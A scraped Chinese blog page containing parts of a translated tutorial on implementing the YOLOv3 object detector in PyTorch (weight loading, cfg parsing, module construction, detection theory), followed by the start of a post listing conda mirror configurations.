读取权重时必须格外小心。权重只是存储为浮点数，没有任何东西指引我们它们属于哪一层。如果你搞砸了，没有什么可以阻止你，比如说，把BN的权重加载到那些卷积层中。因为你只读浮点数，所以没有办法区分哪个权重属于哪一层。因此，我们必须了解权重是如何存储的。 首先，权值只属于两种类型的层，一种是BN层，另一种是卷积层。 这些层的权重完全按照它们在配置文件中出现的顺序存储。当BN层出现在卷积块中时就没有bias。然而，当没有BN层时，bias “权重”必须从文件中读取。 下面的图表总结了权重文件如何存储的权重的： ¶加载权重文件 让我们写一个函数来加载权重。它将是 Darknet 类的成员函数。它会采用除了 self 之外的一个参数，即权重文件的路径. 权重文件的前160个字节存储5个int32值，这些值构成了文件的头部。 1234567891011def load_weights(self, weight_file): fp = open(weight_file, &quot;rb&quot;) # The first 5 values are header information # 1. Major version number # 2. Minor Version Number # 3. Subversion number # 4,5. Images seen by the network (during training) header = np.fromfile(fp, dtype=np.int32, count=5) self.header = torch.from_numpy(header) self.seen = self.header[3] 其余位现在按照上面描述的顺序表示权重。权重以浮动32位或32位浮点的形式存储。让我们把剩下的重量加载到 np.ndarray 中。 1weights = np.fromfile(fp, dtype = np.float32) 现在，我们迭代权重文件，并将权重加载到网络的模块中。 123456ptr = 0for i in range(len(self.module_list)): module_type = self.blocks[i + 1][&quot;type&quot;] # 如果module_type时convolutional则加载权重 # 否则就跳过 在循环中，我们首先检查卷积块是否具有批量归一化。在此基础上，我们加载权重。 1234567if module_type == &#x27;convolutional&#x27;: model = self.module_list[i] try: batch_norm = int(self.blocks[i + 1][&#x27;batch_normalize&#x27;]) except: batch_norm = 0 conv = model[0] 我们使用一个名为 ptr 的变量来跟踪我们在 weights 数组中的位置。现在，如果 batch_normalize 为正，我们按照以下方式加载权重。 1234567891011121314151617181920212223242526272829if batch_norm: bn = model[1] # 获取BN层的权重参数数量 num_bn_biases = bn.bias.numel() bn_biases = torch.from_numpy(weights[ptr:ptr + num_bn_biases]) ptr += num_bn_biases # 获取权重参数 bn_weights = torch.from_numpy(weights[ptr: ptr + num_bn_biases]) ptr += num_bn_biases bn_running_mean = torch.from_numpy(weights[ptr: ptr + num_bn_biases]) ptr += num_bn_biases bn_running_var = torch.from_numpy(weights[ptr: ptr + num_bn_biases]) ptr += num_bn_biases # Cast the loaded weights into dims of model weights. bn_biases = bn_biases.view_as(bn.bias.data) bn_weights = bn_weights.view_as(bn.weight.data) bn_running_mean = bn_running_mean.view_as(bn.running_mean) bn_running_var = bn_running_var.view_as(bn.running_var) # Copy the data to model bn.bias.data.copy_(bn_biases) bn.weight.data.copy_(bn_weights) bn.running_mean.copy_(bn_running_mean) bn.running_var.copy_(bn_running_var) 如果 batch_norm 为False，只需加载卷积层的偏差即可。 12345678910111213else: # Number of biases num_biases = conv.bias.numel() # Load the weights conv_biases = torch.from_numpy(weights[ptr: ptr + num_biases]) ptr = ptr + num_biases # reshape the loaded weights according to the dims of the model weights conv_biases = conv_biases.view_as(conv.bias.data) # Finally copy the data conv.bias.data.copy_(conv_biases) 最后，加载卷积层的权值。 123456789# 为卷积层加载权重num_weights = conv.weight.numel()# Do the same as above for weightsconv_weights = torch.from_numpy(weights[ptr:ptr + num_weights])ptr = ptr + num_weightsconv_weights = conv_weights.view_as(conv.weight.data)conv.weight.data.copy_(conv_weights) 我们已经完成了这个函数，现在您可以通过调用 Darknet 对象上的 load_weights 函数来加载权重参数 12model = Darknet(&#x27;cfg/yolov3.cfg&#x27;).cuda()model.load_weights(&#x27;yolov3.weights&#x27;) 这就是这一部分的全部内容，随着我们模型的建立，加载了权重，我们终于可以开始检测物体了。在接下来的部分，我们将讨论使用objectness score阈值和非极大值抑制来产生我们的最终检测结果。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"}]},{"title":"「YOLOv3」从头实现YOLOv3目标检测（二）构建网络结构","slug":"「YOLOv3」从头实现YOLOv3目标检测（二）构建网络结构","date":"2021-08-18T12:01:08.000Z","updated":"2021-08-19T02:53:36.000Z","comments":true,"path":"2021/08/18/「YOLOv3」从头实现YOLOv3目标检测（二）构建网络结构/","link":"","permalink":"http://blog.keter.top/2021/08/18/%E3%80%8CYOLOv3%E3%80%8D%E4%BB%8E%E5%A4%B4%E5%AE%9E%E7%8E%B0YOLOv3%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E6%9E%84%E5%BB%BA%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/","excerpt":"","text":"本教程转载于：https://blog.paperspace.com/how-to-implement-a-yolo-object-detector-in-pytorch/, 在原教程上加入了自己的理解，我的理解将用 这样的格式写出 这是从头开始实现 YOLO v3检测器的教程的第2部分。在第一部分中，我解释了 YOLO 的工作原理，在这一部分中，我们将使用 PyTorch 实现 YOLO 使用的层。 阅读这篇文章你需要： [ ] 了解Part1有关YOLO工作原理的基础知识 [ ] PyTorch 的基本工作知识，包括如何使用 nn 创建网络结构等。 ¶Getting Started 首先创建一个检测器代码所在的目录。 然后创建一个文件 darknet.py。Darknet 是 YOLO 基础架构的名称。该文件将包含创建 YOLO 网络的代码。我们将用一个名为 util.py 的文件来补充它，该文件将包含各种 helper 函数的代码。将这两个文件保存到文件夹中。您可以使用 git 来跟踪更改。 ¶配置文件 官方代码(用 c 编写)使用一个配置文件来构建网络。cfg 文件逐块描述网络的布局。 我们将使用作者发布的官方 cfg 文件来构建我们的网络。从这里下载它，并将其放在您的检测器目录中一个名为 cfg 的文件夹中。如果你在 Linux 上，把 cd 放到你的网络目录中，然后输入: 123mkdir cfgcd cfgwget https:&#x2F;&#x2F;gitee.com&#x2F;coronapolvo&#x2F;images&#x2F;raw&#x2F;master&#x2F;yolov3.cfg 如果打开配置文件，您将看到如下内容。 123456789101112131415161718192021222324252627[convolutional]batch_normalize=1filters=64size=3stride=2pad=1activation=leaky[convolutional]batch_normalize=1filters=32size=1stride=1pad=1activation=leaky[convolutional]batch_normalize=1filters=64size=3stride=1pad=1activation=leaky[shortcut]from=-3activation=linear 我们看到上面4个block。其中，3层描述卷积层，其次是一个残差层。残差层是一个跳过连接，就像 ResNet 中使用的那样。在 YOLO 中使用了5种类型的网络层: ¶Convolutional 1234567[convolutional]batch_normalize&#x3D;1 filters&#x3D;64 size&#x3D;3 stride&#x3D;1 pad&#x3D;1 activation&#x3D;leaky ¶Shortcut 123[shortcut]from&#x3D;-3 activation&#x3D;linear ¶Upsample 12[upsample]stride&#x3D;2 使用双线性上采样，通过步长因子对前一层的feature map进行上采样 ¶Route 12345[route]layers &#x3D; -4[route]layers &#x3D; -1, 61 路线图层值得解释一下。它有一个属性层，可以有一个或两个值。 当 layers 属性只有一个值时，它输出按该值索引的层的特征映射。在我们的例子中，它是 -4，所以图层将输出从route层向后四层的feature map。 当图层有两个值时，它返回两个feature map连接之后的结果。在我们的例子中，它是 -1,61，这个层将输出前一个层(- 1)和61层的feature map，并沿着深度维连接起来（stack起来）。 ¶YOLO 123456789[yolo]mask &#x3D; 0,1,2anchors &#x3D; 10,13, 16,30, 33,23, 30,61, 62,45, 59,119, 116,90, 156,198, 373,326classes&#x3D;80num&#x3D;9jitter&#x3D;.3ignore_thresh &#x3D; .5truth_thresh &#x3D; 1random&#x3D;1 YOLO 层对应于第1部分中描述的检测层。anchors描述了9个锚节点，但是只使用由 mask 标记属性索引的锚节点。这里，mask 的值为0、1、2，这意味着使用了第一、第二和第三个锚。这是有道理的，因为检测层的每个cell预测3个box。总的来说，我们有3个尺度的探测层，共计9个锚。 ¶Net 12345678910111213141516[net]# Testingbatch&#x3D;1subdivisions&#x3D;1# Training# batch&#x3D;64# subdivisions&#x3D;16width&#x3D; 320height &#x3D; 320channels&#x3D;3momentum&#x3D;0.9decay&#x3D;0.0005angle&#x3D;0saturation &#x3D; 1.5exposure &#x3D; 1.5hue&#x3D;.1 在 cfg 中还有另一种类型的块称为 net，但我不会称它为一个层，因为它只描述了关于网络输入和训练参数的信息。在 YOLO 的前向传播中没有使用。然而，它确实为我们提供了像网络输入大小这样的信息，我们用这些信息来调整前向传播中的锚点。 ¶解析配置文件 在开始之前，在 darknet.py 文件的顶部添加必要的导入。 1234567from __future__ import divisionimport torch import torch.nn as nnimport torch.nn.functional as F from torch.autograd import Variableimport numpy as np 我们定义了一个名为 parse_cfg 的函数，它以配置文件的路径作为输入。 1234567def parse_cfg(cfg_file_path): &quot;&quot;&quot; 获取配置文件 返回一个block列表。每个block描述神经元中的一个块 block在列表中表示为字典 &quot;&quot;&quot; 这里的思路是解析 cfg文件，并将每个块存储为字典。块的属性及其值作为键值对存储在字典中。在解析 cfg 时，我们不断将这些命令(在代码中由变量块表示)附加到列表块中。我们的函数将返回这个block list。 我们首先将 cfg 文件的内容保存到一个字符串列表中。下面的代码对此列表执行一些预处理。 12345file = open(cfg_file_path, &#x27;r&#x27;)lines = file.read().split(&#x27;\\n&#x27;) # 将lines按行拆分储存在list中lines = [x for x in lines if len(x) &gt; 0] # 去除空行lines = [x for x in lines if x[0] != &#x27;#&#x27;] # 去除注释lines = [x.rstrip().lstrip() for x in lines] # 去除多余的空格 然后，我们循环结果列表以获得block。 1234567891011121314block = &#123;&#125;blocks = []for line in lines: if lines[0] == &#x27;[&#x27;: # 这标志着一个新block的开始 if len(block) != 0: # 如果block不是空的，则意味着它存储了前一个block的值。 blocks.append(block) # 添加到 blocks list 里 block = &#123;&#125; # 初始化block block[&#x27;type&#x27;] = line[1:-1].rstrip() else: key, value = line.split(&#x27;=&#x27;) block[key.rstrip()] = value.lstrip()blocks.append(block)return blocks ¶构建blocks 现在，我们将使用上面 parse_cfg 返回的列表为配置文件中的块构造 PyTorch 模块。 我们在列表中有5种类型的图层(上面提到过)。PyTorch 为卷积类型和 upsample 类型提供了预构建层。我们必须通过 torch.nn 为其余的层编写我们自己的模块。 create_modules 函数接受 parse_cfg 函数返回的列表块。 12345def create_modules(blocks): net_info = blocks[0] # 捕获有关输入和预处理的信息, 也就是net里面的信息 module_list = nn.ModuleList() prev_filters = 3 output_filters = [] 在遍历块列表之前，我们定义一个变量 net_info 来存储关于网络的信息。 nn.ModuleList Our function will return a nn.ModuleList. This class is almost like a normal list containing nn.Module objects. However, when we add nn.ModuleList as a member of a nn.Module object (i.e. when we add modules to our network), all the parameters of nn.Module objects (modules) inside the nn.ModuleList are added as parameters of the nn.Module object (i.e. our network, which we are adding the nn.ModuleList as a member of) as well. 在定义新的卷积层时，必须定义卷积核的维数。虽然卷积核的高度和宽度是由 cfg 文件提供的，但卷积核的深度恰恰是前一层中存在的过滤器的数量(或feature map的深度)。这意味着我们需要跟踪过滤器的数量在层卷积层正在应用。我们使用变量 prev_filter 来实现这一点。我们将其初始化为3，因为图像有3个对应于RGB通道的过滤器。 route层从以前的层带来feature map。如果在一个路由层的正前方有一个卷积层，那么内核将被应用到之前层的feature map上，恰好是路由层带来的feature map。因此，我们需要跟踪过滤器的数量，不仅在前一层，每一个前面的层上都需要跟踪。在迭代过程中，我们将每个block的输出筛选器数附加到列表 output_filters 中。 现在，接下来的思路就是迭代块列表，并为每个块创建一个 PyTorch 模块。 123456for index, x in enumerate(blocks[1:]): module = nn.Sequential() # 检查block的类型 # 为block创建新的module # 添加进module_list当中 nn.Sequential()是用来顺序的执行一些nn.Module对象。如果你cfg文件，你将会发现一个block中将会包含超过一个layer。例如convolutional block中就有batch norm层也有leaky ReLU激活层，此外还有卷积层。使用使用nn.Sequential 和 add_module 将这些层添加起来。 1234567891011121314151617181920212223242526272829303132333435363738if x[&#x27;type&#x27;] == &#x27;convolutional&#x27;: activation = x[&#x27;activation&#x27;] try: batch_normalize = int(x[&#x27;batch_normalize&#x27;]) bias = False except: batch_normalize = 0 bias = True filters = int(x[&#x27;filters&#x27;]) padding = int(x[&#x27;pad&#x27;]) kernel_size = int(x[&#x27;size&#x27;]) stride = int(x[&#x27;stride&#x27;]) if padding: pad = (kernel_size - 1) // 2 else: pad = 0 # 添加卷积层 conv = nn.Conv2d(prev_filters, filters, kernel_size, stride, pad, bias=bias) module.add_module(&#x27;conv_&#123;0&#125;&#x27;.format(index), conv) # 添加BN层 if batch_normalize: bn = nn.BatchNorm2d(filters) module.add_module(&#x27;batch_norm_&#123;0&#125;&#x27;.format(index), bn) # 激活函数 if activation == &#x27;leaky&#x27;: activn = nn.LeakyReLU(0.1, inplace=True) module.add_module(&#x27;leaky_&#123;0&#125;&#x27;.format(index), activn)# 上采样层elif x[&#x27;type&#x27;] == &#x27;upsample&#x27;: stride = int(x[&#x27;stride&#x27;]) upsample = nn.Upsample(scale_factor=stride, mode=&quot;bilinear&quot;) module.add_module(&quot;upsample_&#123;&#125;&quot;.format(index), upsample) Route Layer / Shortcut Layers 123456789101112131415161718192021222324# route layerelif x[&#39;type&#39;] &#x3D;&#x3D; &#39;route&#39;: x[&#39;layers&#39;] &#x3D; x[&#39;layers&#39;].split(&#39;,&#39;) start &#x3D; int(x[&#39;layers&#39;][0]) try: end &#x3D; int(x[&quot;layers&quot;][1]) except: end &#x3D; 0 # 位置标注 if start &gt; 0: start &#x3D; start - index if end &gt; 0: end &#x3D; end - index route &#x3D; EmptyLayer() module.add_module(&quot;route_&#123;0&#125;&quot;.format(index), route) if end &lt; 0: filters &#x3D; output_filters[index + start] + output_filters[index + end] else: filters &#x3D; output_filter[index + start]# shortcut layerelif x[&#39;type&#39;] &#x3D;&#x3D; &#39;shortcut&#39;: shortcut &#x3D; EmptyLayer() module.add_module(&#39;shortcut_&#123;0&#125;&#39;.format(index), shortcut) 创建路由层的代码值得做一些解释。首先，我们提取 layers 属性的值，将其强制转换为一个整数并将其存储在一个列表中。 然后我们有一个新的层叫做 EmptyLayer，顾名思义，它只是一个空层。 1route &#x3D; EmptyLayer() 它的定义如下： 123class EmptyLayer(nn.Module): def __init__(self): super(EmptyLayer, self).__init__() 等等，一个空的layer？ 现在，一个空层可能看起来很奇怪，因为它什么也不做。route 层，就像任何其他层执行一个操作(提前前一层/连接)。在 PyTorch 中，当我们定义一个新层时，我们将nn.Module 子类化。将层的执行操作写入到 forward 函数当中。 为了给 Route block构建一个层，我们必须构建一个 nn.Module。用属性层的值作为其成员初始化的模块对象。然后，我们可以在 forward 函数中编写代码来连接或者提取feature map。最后，我们在网络的forward中执行这一层。 但是，考虑到连接代码相当简短(在feature map中torch。cat) ，如上所述设计一个层将导致不必要的抽象，只会增加模板代码。相反，我们可以做的是放置一个虚拟层代替路由层，然后在 nn 的forward函数中直接执行连接操作。表示 darknet 的模块对象。 位于路由层前面的卷积层将其卷积核应用于(可能是连接的)前面层的feature map。下面的代码更新 filters 变量以保存路由层输出的filters的数量。 12345if end &lt; 0: # 如果我们连接feature map filters = output_filters[index + start] + output_filters[index + end]else: filters= output_filters[index + start] Shortcut还利用了一个空层，因为它还是只执行一个非常简单的操作(添加)。没有必要更新filters，因为它只是添加了前一层的feature map到后面的层。 YOLO Layer 最后，我们编写创建 YOLO 层的代码。 123456789101112# yolo 检测层 detection layerelif x[&#x27;type&#x27;] == &#x27;yolo&#x27;: mask = x[&#x27;mask&#x27;].split(&#x27;,&#x27;) mask = [int(x) for x in mask] anchors = x[&#x27;anchors&#x27;].split(&#x27;,&#x27;) anchors = [int(a) for a in anchors] anchors = [(anchors[i], anchors[i + 1]) for i in range(0, len(anchors), 2)] anchors = [anchors[i] for i in mask] detection = DetectionLayer(anchors) module.add_module(&quot;Detection_&#123;0&#125;&quot;.format(index), detection) 我们定义了一个新的层DetectionLayer，用来保存用于检测box的锚。 DetectionLayer定义如下： 1234class DetectionLayer(nn.Module): def __init__(self, anchors): super(DetectionLayer, self).__init__() self.anchors = anchors 在循环的最后，我们添加一些代码： 123module_list.append(module)prev_filters = filtersoutput_filters.append(filters) 这就是循环的主体部分。在 create_modules 函数的末尾，我们返回 net_info 和 module_list。 ¶测试代码 可以通过在 darknet.py 结尾输入以下行并运行该文件来测试代码。 123if __name__ == &#x27;__main__&#x27;: blocks = parse_cfg(&#x27;cfg/yolov3.cfg&#x27;) print(create_modules(blocks)) 您将看到一个很长的列表(精确地包含106个条目) ，其中的元素看起来像 123456789101112131415161718(6): Sequential( (conv_6): Conv2d(128, 64, kernel_size=(1, 1), stride=(1, 1), bias=False) (batch_norm_6): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (leaky_6): LeakyReLU(negative_slope=0.1, inplace=True))(7): Sequential( (conv_7): Conv2d(64, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (batch_norm_7): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (leaky_7): LeakyReLU(negative_slope=0.1, inplace=True))(8): Sequential( (shortcut_8): EmptyLayer())(9): Sequential( (conv_9): Conv2d(128, 64, kernel_size=(1, 1), stride=(1, 1), bias=False) (batch_norm_9): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (leaky_9): LeakyReLU(negative_slope=0.1, inplace=True)) 这部分就到这里。在接下来的部分中，我们将组装已经创建的构建块，以便从图像生成输出。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"}]},{"title":"「YOLOv3」从头实现YOLOv3目标检测（一）YOLO基础知识","slug":"「YOLOv3」从头实现YOLOv3目标检测（一）YOLO基础知识","date":"2021-08-18T08:42:41.000Z","updated":"2021-08-18T11:45:13.000Z","comments":true,"path":"2021/08/18/「YOLOv3」从头实现YOLOv3目标检测（一）YOLO基础知识/","link":"","permalink":"http://blog.keter.top/2021/08/18/%E3%80%8CYOLOv3%E3%80%8D%E4%BB%8E%E5%A4%B4%E5%AE%9E%E7%8E%B0YOLOv3%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%EF%BC%88%E4%B8%80%EF%BC%89YOLO%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"本教程转载于：https://blog.paperspace.com/how-to-implement-a-yolo-object-detector-in-pytorch/, 在原教程上加入了自己的理解，我的理解将用 这样的格式写出 这是一个关于从头开始构建 YOLO v3检测器的教程，详细介绍了如何从配置文件创建网络体系结构、加载权重和设计输入/输出管道。 ¶什么是YOLO？ YOLO 代表你只看一次( You Only Look Once)。它是一种物体探测器，利用深度卷积神经网络学到的特征来探测物体。在我们开始写代码之前，我们必须了解 YOLO 是如何工作的。 ¶一个完整的卷积神经网络 YOLO 仅使用卷积层，使其成为一个完全卷积网络(FCN)。它有75个卷积层，带有跳过连接和上采样层。没有使用任何形式的pooling，使用stride为2的卷积层对特性映射进行下采样。这有助于防止由于池化而导致的低级特性的丢失。 作为一个 FCN，YOLO 可以允许输入任意大小的图片。然而，在实践中，由于各种各样的问题，我们可能希望坚持一个固定的输入大小。 这些问题中最大的一个是，如果我们想批量处理图像(批量处理图像可以通过 GPU 并行处理，从而提高速度) ，我们需要所有固定高度和宽度的图像。这需要将多个图像连接到一个batch处理。 网络通过给卷积操作指定较大的stride来实现下采样。例如，如果网络的步幅是32，那么一个416 x 416的输入图像将产生一个13 x 13的输出。 ¶解释输出 通常情况下( 所有对象检测器都是这样的) ，卷积层学习的特征会被传递到一个分类器/回归器，从而进行接下来的预测(预测box的坐标，类标签等)。 在 YOLO，预测是通过使用1 x 1的卷积层来完成的。 现在，首先要注意的是我们的输出是一个feature map。由于我们已经使用了1 x 1的卷积核，所以预测图的大小正好是之前特征图的大小。在 YOLO v3(及其之后的版本)中，每个网格可以预测一个固定数量的边界框。 我们的feature map有(b x (5 + c))个属性。B表示每个单元所能预测的box的数量（anchor box的数量）。根据论文，anchor box中的每一个box都可能专门用于检测特定类型的物体。每个box都有 5 + c 个属性，这些属性描述了每个box的中心坐标、维度、对象得分和类别置信度。YOLOv3将会为每个格点预测3个检测框。 这一段如果之前完全没有接触过YOLO系列的文章话，可能会比较懵。YOLO系统的一个核心思想就是将图像划分为NxN的网格。针对每个格点算法先指定几个anchor，选出最合适的anchor后对它的形状进行微调 让我们考虑下面的一个例子，其中输入的图像是416 x 416，网络的stride是32。如前所述，feature map的尺寸将会变为13 x 13。接着我们将输入图像分成13 × 13个单元。 在图像中，黄色的框是ground truth box（标注框），其中标注框的中心点所在的网格被标记为了红色。该网格预测出来的box将会被作为预测候补 现在，红色单元格是网格中第7行的第7个单元格。现在，我们将feature map中第7行的第7个单元(特征映射中的对应单元)分配为负责检测狗狗的单元格。 现在，这个红色的网格可以预测三个边界框。但是哪一个会作为狗狗的预测框呢？为了理解这一点，我们必须首先理解锚（anchor）的概念。 注意，我们在这里讨论的单元格是预测的feature map上的一个单元格。我们将输入的图像划分为一个网格，以确定预测feature map上的哪个单元的是负责预测 ¶Anchor Boxes 预测bounding box的宽度和高度可能是有意义的，但在实践中，这会导致在训练过程中不稳定的梯度。相反，大多数现代目标检测器都会预测对数空间变换。说人话就是，我们先选几个默认的框。这些默认的框叫做anchor，然后我们预测anchor和真实box之间的偏移量（上移一点、下移一点....） YOLOV3中每个单元格会预测三个检测框。 回到我们之前的问题，负责检测狗狗的边界框将是一个与真实标签具有最大重合度的anchor box。 ¶做出预测 下面的公式描述了如何转换网络输出以获得预测的边界框。 bx=σ(tx)+cxby=σ(ty)+cybw=pwetwbh=pheth\\begin{gathered} b_{x}=\\sigma\\left(t_{x}\\right)+c_{x} \\\\ b_{y}=\\sigma\\left(t_{y}\\right)+c_{y} \\\\ b_{w}=p_{w} e^{t_{w}} \\\\ b_{h}=p_{h} e^{t_{h}} \\end{gathered} \\\\ bx​=σ(tx​)+cx​by​=σ(ty​)+cy​bw​=pw​etw​bh​=ph​eth​​ bxb_xbx​，byb_yby​，bwb_wbw​，bhb_hbh​ 是我们预测的 x，y 中心坐标，宽度和高度。txt_xtx​，tyt_yty​，twt_wtw​，这就是网络的输出。cxc_xcx​ 和 cyc_ycy​ 是坐标网格的左上角坐标。pwp_wpw​和php_hph​的锚的尺寸。 ¶中心坐标 请注意，我们正在通过一个sigmoid函数来得到我们的中心坐标的预测值。这将强制输出的值在0到1之间。为什么会这样呢？ 通常，YOLO 不会预测边界框的中心的绝对坐标，它预测的偏移量是（这两句话不知道怎么翻译了…）: 例如，现在我们要预测一个狗狗。如果中心的预测值是(0.4,0.7) ，那么这意味着中心的坐标为(6.4,6.7) 。(因为红色网格的左上方坐标是(6,6))。 但是，如果预测的 x，y 坐标大于1，比如说(1.2,0.7) ，会发生什么呢。这意味着中心位于(7.2,6.7)。请注意，中心现在位于红细胞的右边，或者第7行的第8个细胞。这打破了 YOLO 背后的理论，因为如果我们假设红色盒子负责预测狗，狗的中心肯定位于红色细胞，而不是旁边的那个。 因此，为了补救这个问题，输出通过一个Sigmoid函数，它将输出压缩在0到1的范围内，这样预测值就可以有效地保持在预测的网格中心。 ¶Bounding Box的尺寸 边界框尺寸的预测尺寸是通过将anchor乘以一个对数转换空间来得到的。 产生的预测，bwb_wbw​ 和 bhb_hbh​，是根据图像的高度和宽度进行了归一化之后的结果。(训练标签也是这样的)。因此，如果包含狗的盒子的预测 bx 和 by 为(0.3,0.8) ，那么13x13特征映射的实际宽度和高度为(13x0.3,13x0.8)。 ¶Objectness Score 对象得分表示对象包含在边界框中的概率。对于红色和相邻的网格，它应该接近1，而对于拐角处的网格，它应该接近0。 对象性得分也通过一个Sigmoid函数，因为它可以被理解为一个概率。 ¶Class Confidences 类别信任度表示被检测对象属于特定类别(狗、猫、香蕉、汽车等)的概率。在 v3版本之前，YOLO 习惯于对class scores进行softmax处理。 然而，这种设计在 v3中被取消了，作者们选择了使用 sigmoid。原因在于，Softmaxing 类分数假定这些类是相互排斥的。简单地说，如果一个对象属于一个类，那么它就保证不能属于另一个类。如果我们的检测器是基于COCO数据集，这样是正确的。 然而，当我们有像 Women 和 Person 这样的类别时，这种假设可能就不成立了。这就是作者避免使用 Softmax 激活函数的原因。 Softmax函数是在分类网络中经常出现一种处理方式，YOLOv3这样的处理方式也可以给我们一些启示 ¶不同尺度的预测 YOLOv3可以在3个不同的尺度（scale）上进行预测。所述检测层用于对三种不同大小的特征图进行检测，分别具有32、16、8步。这意味着，在输入416 x 416的情况下，我们可以在13 x 13,26 x 26和52 x 52三个规模的特征图上进行检测。 网络对输入图像进行下采样直到第一个检测层，在第一个检测层中使用stride为32的卷积层的feature map进行检测。此外，网络层还会被上采样到2倍大小，并与具有相同大小feature map的先前层进行连接。另一个检测发生在stride为16的层。重复同样的上采样过程，并在stride为8的层进行最终检测。 在每个scale，每个单元格都会预测3个边界盒使用3个锚，使总数锚使用9。(不同scale的锚是不同的) 在作者的报告说，这有助于 YOLOv3更好地检测小对象，这是早期版本 YOLO 经常抱怨的问题。上采样可以帮助网络学习细粒度的特征，这些特征将有助于检测小物体。 ¶输出处理 对于大小为416 x 416的图像，YOLO 将预测((52 x 52) + (26 x 26) + 13 x 13) x3 = 10647个box。然而，在我们的图像中，只有一个物体，一只狗。我们如何将侦测到的数量从10647减少到1？ ¶基于目标置信度的阈值分割 首先，我们根据Ojectness score 过滤一些框。通常，得分低于阈值的框将被过滤掉。 ¶NMS极大值抑制 NMS 的目的是解决同一图像的多重检测问题。例如，红色网格单元格的所有3个边框都可能检测到一个框，或者相邻的单元格可能检测到同一个对象。 YOLO 只能检测训练数据集中出现过的类别对象。我们将使用官方的权重文件。通过对 COCO 数据集进行网络训练，从而可以检测出80种目标类别。 这就是第一部分。这篇文章充分解释了 YOLO 算法，使你能够实现检测器。然而，如果你想深入了解 YOLO 的工作原理，它是如何被训练的，以及与其他探测器相比它的表现如何，你可以阅读原始的论文。 在下一部分中，我们将实现组装检测器所需的各种layer。","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"深度学习基础知识/yolo","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/yolo/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"yolo","slug":"yolo","permalink":"http://blog.keter.top/tags/yolo/"}]},{"title":"「工具箱」coronaPolvo的工具箱","slug":"「工具箱」coronaPolvo的工具箱","date":"2021-08-17T13:38:05.000Z","updated":"2021-11-03T10:01:09.075Z","comments":true,"path":"2021/08/17/「工具箱」coronaPolvo的工具箱/","link":"","permalink":"http://blog.keter.top/2021/08/17/%E3%80%8C%E5%B7%A5%E5%85%B7%E7%AE%B1%E3%80%8DcoronaPolvo%E7%9A%84%E5%B7%A5%E5%85%B7%E7%AE%B1/","excerpt":"","text":"¶conda源 添加源 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152vim ~/.condarc# 中科大channels: - https://mirrors.ustc.edu.cn/anaconda/pkgs/main/ - https://mirrors.ustc.edu.cn/anaconda/pkgs/free/ - https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/ssl_verify: true # 清华channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ssl_verify: true # 豆瓣源channels: - https://pypi.douban.com/anaconda/cloud/conda-forge/ - https://pypi.douban.com/anaconda/cloud/msys2/ - https://pypi.douban.com/anaconda/cloud/bioconda/ - https://pypi.douban.com/anaconda/cloud/menpo/ - https://pypi.douban.com/anaconda/cloud/pytorch/ssl_verify: true----- 究极配置方案# .condarcauto_activate_base: falsechannels: - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/msys2 - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/mro - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/main - https://mirrors.sjtug.sjtu.edu.cn/anaconda/pkgs/free - defaultsshow_channel_urls: truechannel_alias: https://mirrors.tuna.tsinghua.edu.cn/anaconda#default_channels:# - 